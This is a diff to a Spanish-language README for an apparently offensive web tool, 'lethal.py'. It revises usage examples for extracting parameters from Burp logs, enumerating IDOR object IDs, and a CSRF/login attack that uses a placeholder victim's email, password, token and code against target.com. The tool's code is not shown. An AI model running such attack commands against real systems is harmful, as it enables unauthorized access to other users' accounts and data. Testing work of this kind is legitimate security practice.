@@ -80,22 +80,19 @@ pip install -r requirements.txt
 🧬 Extracción de parámetros sospechosos (desde Burp)
 
 ```bash
-python3 lethal.py --log burp_logs.txt
+python3 lethal.py --url "https://target.com/api/user?id=123"--burp-logs burp_logs.txt
 ```
 
 ## 💣 Explotación IDOR (con payloads agresivos)
 
 ```bash
-python3 lethal.py --url "https://target.com/api/user?id=123" --param id --ids ids.txt --method GET --signature "acceso denegado"
+python3 lethal.py --url "https://target.com/api/user?id=123" --param id --ids ids.txt --method GET --forbidden "acceso denegado"
 ```
 
 ## 🔐 Ataque CSRF/Login con token
 
 ```bash
-python3 lethal.py --csrf --url "https://target.com/api/login" \
-  --email "victima@example.com" --password "123456" \
-  --token "tok-abcdef" --verification "000000" \
-  --redirect "https://target.com/dashboard"
+python3 lethal.py --url "https://target.com/api/login" --email "victima@example.com" --password "123456" --token "tok-abcdef" --code "000000" --redirect "https://target.com/dashboard"
 ```
 
 ## ⚙️ Parámetro	Descripción
